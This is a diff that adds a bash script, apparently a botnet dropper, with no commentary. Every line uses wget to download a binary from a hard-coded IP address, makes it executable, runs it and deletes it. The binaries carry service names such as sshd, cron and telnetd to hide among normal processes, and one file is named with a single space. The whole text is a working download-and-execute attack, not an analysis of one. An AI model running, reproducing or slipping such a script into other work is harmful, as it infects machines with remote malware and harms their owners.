@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.233/weriseyoufallntpd; chmod +x weriseyoufallntpd; ./weriseyoufallntpd; rm -rf weriseyoufallntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.233/weriseyoufallsshd; chmod +x weriseyoufallsshd; ./weriseyoufallsshd; rm -rf weriseyoufallsshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.233/weriseyoufallopenssh; chmod +x weriseyoufallopenssh; ./weriseyoufallopenssh; rm -rf weriseyoufallopenssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.233/weriseyoufallbash; chmod +x weriseyoufallbash; ./weriseyoufallbash; rm -rf weriseyoufallbash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.233/weriseyoufalltftp; chmod +x weriseyoufalltftp; ./weriseyoufalltftp; rm -rf weriseyoufalltftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.233/weriseyoufallwget; chmod +x weriseyoufallwget; ./weriseyoufallwget; rm -rf weriseyoufallwget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.233/weriseyoufallcron; chmod +x weriseyoufallcron; ./weriseyoufallcron; rm -rf weriseyoufallcron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.233/weriseyoufallftp; chmod +x weriseyoufallftp; ./weriseyoufallftp; rm -rf weriseyoufallftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.233/weriseyoufallpftp; chmod +x weriseyoufallpftp; ./weriseyoufallpftp; rm -rf weriseyoufallpftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.233/weriseyoufallsh; chmod +x weriseyoufallsh; ./weriseyoufallsh; rm -rf weriseyoufallsh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.233/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.233/weriseyoufallapache2; chmod +x weriseyoufallapache2; ./weriseyoufallapache2; rm -rf weriseyoufallapache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.233/weriseyoufalltelnetd; chmod +x weriseyoufalltelnetd; ./weriseyoufalltelnetd; rm -rf weriseyoufalltelnetd
